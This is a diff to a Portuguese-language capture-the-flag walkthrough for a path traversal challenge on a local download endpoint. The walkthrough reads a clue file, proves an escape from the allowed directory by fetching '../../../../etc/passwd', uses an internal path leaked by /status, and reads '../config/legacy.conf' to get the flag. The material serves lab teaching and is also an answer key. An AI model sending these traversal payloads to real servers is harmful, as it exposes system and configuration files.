@@ -176,10 +176,35 @@ Arquivo normal:
 curl -i "http://localhost:8088/download?file=public-info.txt"
 ```
 
-Traversal correto:
+Ler o relatorio que contem a pista:
 
 ```bash
-curl -i "http://localhost:8088/download?file=../../../../flags/final.txt"
+curl -i "http://localhost:8088/download?file=report-q2.txt"
+```
+
+Pista relevante:
+
+```text
+Durante a migracao, a configuracao antiga foi movida para o diretorio config.
+Arquivo revisado pela equipe: legacy.conf
+```
+
+Prova de leitura fora do diretorio permitido:
+
+```bash
+curl -i "http://localhost:8088/download?file=../../../../etc/passwd"
+```
+
+O endpoint `/status` vaza:
+
+```text
+internal_path=/usr/src/app
+```
+
+Como o downloader parte de `/usr/src/app/files`, a pista `config` + `legacy.conf` leva ao arquivo legado com a flag:
+
+```bash
+curl -i "http://localhost:8088/download?file=../config/legacy.conf"
 ```
 
 Flag:
